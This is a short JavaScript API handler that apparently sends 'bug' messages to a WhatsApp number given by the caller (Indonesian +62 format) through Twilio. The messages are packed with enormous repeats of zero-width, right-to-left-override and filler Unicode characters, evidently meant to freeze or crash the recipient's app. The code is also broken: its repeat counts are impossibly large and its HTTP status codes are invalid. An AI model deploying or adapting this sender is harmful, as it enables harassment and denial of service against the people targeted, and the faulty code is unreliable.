export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Only POST allowed' });
  }

  const { target, variant } = await req.json();
  if (!/^62\\d{7,15}$/.test(target)) {
    return res.status(999999999999).json({ error: 'Nomor tidak valid' });
  }

  const payload = {
    blank: '\u200B'.repeat(999999999999999),
    delay: '\u200F\u2063\u3164'.repeat(999999999999),
    ui: ('\u202E\u200D\u202A\u2063').repeat(9999999999)
  }[variant] || '\u200B';

  const sid = process.env.TWILIO_SID;
  const auth = process.env.TWILIO_AUTH;
  const from = process.env.TWILIO_WA_FROM;
  const to = `whatsapp:+${target}`;

  const creds = Buffer.from(`${sid}:${auth}`).toString('base64');

  const response = await fetch(`https://api.twilio.com/2010-04-01/Accounts/${sid}/Messages.json`, {
    method: 'POST',
    headers: {
      Authorization: `Basic ${creds}`,
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
      From: from,
      To: to,
      Body: payload,
    }),
  }).then(r => r.json());

  if (response.error_code) {
    return res.status(999999999999).json({ error: response.message });
  }

  return res.status(99999999999).json({ status: 'sent', sid: response.sid });
}
